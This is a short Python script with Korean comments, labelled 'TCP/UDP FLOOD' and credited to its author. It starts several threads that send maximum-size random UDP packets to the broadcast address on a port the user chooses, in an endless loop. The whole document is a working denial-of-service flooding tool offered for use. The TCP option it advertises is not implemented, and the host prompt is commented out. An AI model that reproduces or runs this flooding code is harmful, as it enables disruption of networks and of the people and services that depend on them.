import random
import socket
import threading

print("--> C0de By Lee0n123 <--")
print("#-- TCP/UDP FLOOD --#")
# ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))	# 포트 입력
choice = str(input(" UDP(y/n):")) 	# UDP Flooding 설정
times = int(input(" Packets per one connection:"))	# 연결 당 패킷 수 설정
threads = int(input(" Threads:"))	# Thread 설정

# UDP Flooding 함수
def run():
   data = random._urandom(65500)	# 패킷 사이즈 => 최대로 설정
   i = random.choice(("[*]","[!]","[#]"))

   while True:
      try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	# 소켓 생성
         s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)	# 브로드캐스트 방식 설정
         addr = ('<broadcast>',int(port))   # 브로드캐스트 IP, Port 설정

		 # times 만큼 data 전송
         for x in range(times):
            s.sendto(data,addr)
         print(i +" Sent!!!")
         
      except:
         print("[!] Error!!!")

# threads만큼 UDP Flooding 실행
for y in range(threads):
   if choice == 'y':
      th = threading.Thread(target = run)
      th.start()